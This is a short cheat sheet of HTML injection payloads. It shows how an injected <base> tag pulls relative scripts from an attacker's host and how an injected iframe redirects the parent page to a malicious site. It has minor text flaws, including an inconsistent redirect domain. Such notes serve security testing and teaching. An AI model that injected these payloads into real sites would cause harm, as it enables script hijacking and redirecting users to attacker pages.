# HTMLi
HTML Injection Payloads

## base

The HTML 
 element specifies the base URL to use for all relative URLs in a document.
Note: If multiple <base> elements are used, only the first href and first target are obeyed — all others are ignored.

### Relative URL redirection
`<base>` tag injection allows you to redirect relative url to the attacker host. For example, if the vulnerable site includes a script:
```html
<script src="/assets/some-script.js"></script>
```

so, if you inject before the relative remote script:
```html
<base href="https://attacker-website.com">
```
the browser will request https://attacker-website.com/assets/some-script.js.

## iframe
The `<iframe>` tag is used to embed an HTML document in another HTML document. If source of inserted document located on another origin, same origin policy will block any access to content of other document for both of them.

### Open redirect
Child document can view and set location property for parent, even if cross-origin top.window.location.
Inject an iframe to vulnerable-website.com:
```html
<iframe src=//malicious-website.com/toplevel.html></iframe>
```
where `https://malicious-website.com/toplevel.html` contains:
```html
<html><head></head><body><script>top.window.location = "https://malicious-website.com/pwned.html"</script></body></html>
```
When the iframe is loaded, the parent will be redirected to the https://malware-website.com/pwned.html page, even if the child document is loaded from a different origin. Same origin policy will be bypassed because the iframe is not being "sandboxed", q.v. .
